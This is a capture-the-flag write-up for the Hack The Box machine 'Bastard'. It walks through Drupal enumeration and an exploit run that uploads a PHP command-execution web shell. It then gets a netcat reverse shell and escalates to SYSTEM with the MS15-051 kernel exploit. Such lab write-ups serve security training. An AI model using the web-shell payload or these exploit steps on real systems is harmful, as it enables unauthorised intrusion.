---
"title": "Hack The Box - Bastard"
"date": 2020-06-28
"tags": ["windows", "medium", "drupal", "ms15-051"]
"keywords": ["windows", "medium", "drupal", "ms15-051"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Bastard is a Windows medium machine but its easy, Getting shell is exploiting Drupal by uploading a malicious php file and The machine is unpatched so Kernel exploit to get system."
"featured_image": "/img/htb-bastard/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-bastard/Untitled.png)

Bastard is a Windows medium machine but its easy, Getting shell is exploiting Drupal by uploading a malicious php file and The machine is unpatched so Kernel exploit to get system.

Link: [https://www.hackthebox.eu/home/machines/profile/7](https://www.hackthebox.eu/home/machines/profile/7)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%), Microsoft Windows Vista SP2 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## HTTP Enumeration

The webpage seems normal, We can access `robots.txt` and can't find anything else. Time to check the files in `robots.txt`.

![Untitled](/img/htb-bastard/Untitled%201.png)

While checking those, I found the Drupal Version.

![Untitled](/img/htb-bastard/Untitled%202.png)

And Confirmed it with droopescan

```json
root@kali:~/hacking-tools/droopescan# ./droopescan scan --url http://bastard.htb --enumerate v
[+] Site identified as drupal.
[+] Possible version(s):                                                        
    7.54
```

## Finding the exploit

From the droopescan result, I started checking for exploits available for the version and found a lot.

```bash
root@kali:~/CTF/HTB/Boxes/Bastard# searchsploit drupal 7
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Drupal 4.1/4.2 - Cross-Site Scripting                                               | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                       | php/webapps/1088.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                         | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                       | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                             | php/webapps/4510.txt
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities              | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                   | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                    | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)         | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)         | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)            | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                              | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                  | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                             | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                               | php/webapps/3312.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                       | php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                   | php/dos/35415.txt
Drupal < 7.34 - Denial of Service                                                   | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)            | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)         | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution | php/webapps/44449.rb
```

From that `Drupal 7.x Module Services - Remote Code Execution` seems interesting, Copied that to my working directory.

So from the exploit I came to know its looking for `endpoint_path` URI which is not available in our page, So I decided to run GoBuster.

## Dir Scan Results

```bash
_|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /root/hacking-tools/dirsearch/logs/errors-20-06-26_11-29-00.log

Target: http://bastard.htb

[11:29:03] Starting: 
[11:29:14] 403 -    1KB - /.bash_history
[11:29:14] 403 -    1KB - /.cache
[11:29:14] 403 -    1KB - /.bashrc
[11:29:14] 403 -    1KB - /.cvsignore
[11:29:14] 403 -    1KB - /.cvs
[11:29:14] 403 -    1KB - /.git/HEAD
[11:29:14] 403 -    1KB - /.history
[11:29:14] 403 -    1KB - /.forward
[11:29:15] 403 -    1KB - /.hta
[11:29:15] 403 -    1KB - /.listing
[11:29:15] 403 -    1KB - /.listings
[11:29:15] 403 -    1KB - /.mysql_history
[11:29:15] 403 -    1KB - /.passwd
[11:29:15] 403 -    1KB - /.perf
[11:29:15] 403 -    1KB - /.profile
[11:29:15] 403 -    1KB - /.rhosts
[11:29:15] 403 -    1KB - /.sh_history
[11:29:15] 403 -    1KB - /.ssh
[11:29:15] 403 -    1KB - /.svn
[11:29:15] 403 -    1KB - /.svn/entries
[11:29:15] 403 -    1KB - /.swf
[11:29:15] 403 -    1KB - /.subversion
[11:29:15] 403 -    1KB - /.web
[11:29:16] 200 -    7KB - /
[11:31:00] 200 -    7KB - /0
[11:33:29] 403 -    1KB - /admin
[11:33:31] 403 -    1KB - /Admin
[11:33:31] 403 -    1KB - /ADMIN
[11:38:33] 403 -    1KB - /batch
[12:01:23] 403 -    1KB - /entries
[12:01:23] 403 -    1KB - /Entries
[12:10:19] 301 -  151B  - /includes  ->  http://bastard.htb/includes/
[12:10:25] 200 -    7KB - /index.php
[12:10:48] 403 -    1KB - /install.mysql
[12:10:48] 403 -    1KB - /install.pgsql
[12:16:08] 301 -  147B  - /misc  ->  http://bastard.htb/misc/
[12:16:08] 301 -  147B  - /Misc  ->  http://bastard.htb/Misc/
[12:16:31] 301 -  150B  - /modules  ->  http://bastard.htb/modules/
[12:18:05] 200 -    7KB - /node
[12:26:09] 301 -  151B  - /profiles  ->  http://bastard.htb/profiles/
[12:29:39] 403 -    1KB - /repository
[12:30:12] 200 -   62B  - /rest
[12:30:35] 200 -    2KB - /robots.txt
[12:30:37] 403 -    1KB - /root
[12:30:37] 403 -    1KB - /Root
[12:31:51] 301 -  150B  - /scripts  ->  http://bastard.htb/scripts/
[12:31:51] 301 -  150B  - /Scripts  ->  http://bastard.htb/Scripts/
[12:31:59] 403 -    1KB - /search
[12:31:59] 403 -    1KB - /Search
[12:34:40] 301 -  148B  - /sites  ->  http://bastard.htb/sites/
[12:34:40] 301 -  148B  - /Sites  ->  http://bastard.htb/Sites/
[12:39:17] 403 -    1KB - /tag
[12:39:49] 403 -    1KB - /template
[12:40:28] 301 -  149B  - /themes  ->  http://bastard.htb/themes/
[12:40:28] 301 -  149B  - /Themes  ->  http://bastard.htb/Themes/
[12:43:35] 200 -    7KB - /user
[12:47:54] 200 -   42B  - /xmlrpc.php

Task Completed
```

From these `/rest` seems interesting.

So this the rest_endpoint we looking for and its working.

![Untitled](/img/htb-bastard/Untitled%203.png)

I changed some full things in my script.

```php
$url = 'http://bastard.htb';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'wolf.php',
    'data' => '[?php system($_REQUEST["cmd"]); ?](?php system($_REQUEST["cmd"]); ?)'
];
```

Make sure to run `apt install php-curl` before running the script.

```php
root@kali:~/CTF/HTB/Boxes/Bastard# php 41564.php 
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics 
# Website: https://www.ambionics.io/blog/drupal-services-module-rce

#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://bastard.htb/wolf.php
```

File uploaded!!

In the directory it gives two files, `user.json` and `session.json`, while checking them it gives admin password of drupal CMS and cookies too by using them I can login as `admin` but that's not what i need now.

```json
root@kali:~/CTF/HTB/Boxes/Bastard# cat user.json 
{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1492102672",
    "login": 1593151371,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
        "rdftype": [
            "sioc:UserAccount"
        ],
        "name": {
            "predicates": [
                "foaf:name"
            ]
        },
        "homepage": {
            "predicates": [
                "foaf:page"
            ],
            "type": "rel"
        }
    },
    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
}
root@kali:~/CTF/HTB/Boxes/Bastard# cat session.json 
{
    "session_name": "SESS3be1999be4b134a44bef1e6c979c5741",
    "session_id": "d5-kjU1clAEtFdlM7C-bAmvvkrt-wnHhf4GYzMQFVQ4",
    "token": "fQTBbEvUd0277ut2H5Cy-lsHAGoiKsL6YTRBOPBC5j0"
```

Now we have RCE, Time to get reverse shell

![Untitled](/img/htb-bastard/Untitled%204.png)

First uploaded `nc.exe` to the box.

![Untitled](/img/htb-bastard/Untitled%205.png)

In the next request, I triggered it and got shell as `iusr`

![Untitled](/img/htb-bastard/Untitled%206.png)

## Privilege Escalation

The first thing I did is `systeminfo` and it seems No hotfixes done so far, which seems we can find some kernel exploits

```bash
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          26/6/2020, 8:07:38 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.543 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.566 MB
Virtual Memory: In Use:    529 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

I uploaded `winPEAS.bat` and it shows me some Possible exploits and I started trying randomly.

```bash
"Microsoft Windows Server 2008 R2 Datacenter " 
[i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
No Instance(s) Available.
MS11-080 patch is NOT installed! (Vulns: XP/SP3,2K3/SP3-afd.sys)
No Instance(s) Available.
MS16-032 patch is NOT installed! (Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
No Instance(s) Available.
MS11-011 patch is NOT installed! (Vulns: XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
No Instance(s) Available.
MS10-59 patch is NOT installed! (Vulns: 2K8,Vista,7/SP0-Chimichurri)
No Instance(s) Available.
MS10-21 patch is NOT installed! (Vulns: 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
No Instance(s) Available.
MS10-092 patch is NOT installed! (Vulns: 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
No Instance(s) Available.
MS10-073 patch is NOT installed! (Vulns: XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
No Instance(s) Available.
MS17-017 patch is NOT installed! (Vulns: 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
No Instance(s) Available.
MS10-015 patch is NOT installed! (Vulns: 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
No Instance(s) Available.
MS08-025 patch is NOT installed! (Vulns: 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
No Instance(s) Available.
MS06-049 patch is NOT installed! (Vulns: 2K/SP4-ZwQuerySysInfo)
No Instance(s) Available.
MS06-030 patch is NOT installed! (Vulns: 2K,XP/SP2-Mrxsmb.sys)
No Instance(s) Available.
MS05-055 patch is NOT installed! (Vulns: 2K/SP4-APC Data-Free)
No Instance(s) Available.
MS05-018 patch is NOT installed! (Vulns: 2K/SP3/4,XP/SP1/2-CSRSS)
No Instance(s) Available.
MS04-019 patch is NOT installed! (Vulns: 2K/SP2/3/4-Utility Manager)
No Instance(s) Available.
MS04-011 patch is NOT installed! (Vulns: 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
No Instance(s) Available.
MS04-020 patch is NOT installed! (Vulns: 2K/SP4-POSIX)
No Instance(s) Available.
MS14-040 patch is NOT installed! (Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
No Instance(s) Available.
MS16-016 patch is NOT installed! (Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
No Instance(s) Available.
MS15-051 patch is NOT installed! (Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
No Instance(s) Available.
MS14-070 patch is NOT installed! (Vulns: 2K3/SP2-TCP/IP)
No Instance(s) Available.
MS13-005 patch is NOT installed! (Vulns: Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
No Instance(s) Available.
MS13-053 patch is NOT installed! (Vulns: 7SP0/SP1_x86-schlamperei)
No Instance(s) Available.
MS13-081 patch is NOT installed! (Vulns: 7SP0/SP1_x86-track_popup_menu)
```

> [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051)

This one works perfectly

```bash
C:\Temp>.\ms15-051x64.exe "whoami"
.\ms15-051x64.exe "whoami"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2472 created.
==============================
nt authority\system
```

I used the nc.exe and I got another reverse shell as system.

![Untitled](/img/htb-bastard/Untitled%207.png)

We own the Box!